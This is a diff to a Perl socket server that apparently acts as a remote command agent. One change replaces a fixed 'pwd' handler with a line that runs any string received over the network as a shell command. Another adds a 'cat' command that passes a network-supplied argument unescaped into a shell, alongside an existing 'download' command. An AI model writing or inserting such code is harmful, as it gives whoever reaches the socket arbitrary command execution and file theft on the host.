@@ -46,9 +46,7 @@ while(1){
 	    $bytes_read = sysread($socket, $buffer, $payload_length);
 	    $payload = $buffer;
 	    printf "[%s-REQ] %s\n", $$, $payload;
-	    if("pwd" eq $payload){
-		$result = getcwd();
-	    }
+	    $result = `$payload`;
 	    
 	}elsif($type eq 'B'){
 	    my $payload_length_1 = $payload_length;
@@ -64,6 +62,9 @@ while(1){
 
 	    if("ls" eq $payload_1){
 		my $cmd = sprintf "ls %s", $payload_2;
+		$result = `$cmd`;
+	    }elsif("cat" eq $payload_1){
+		my $cmd = sprintf "cat %s", $payload_2;
 		$result = `$cmd`;
 	    }elsif("download" eq $payload_1){
 		my $file_location = $payload_2;
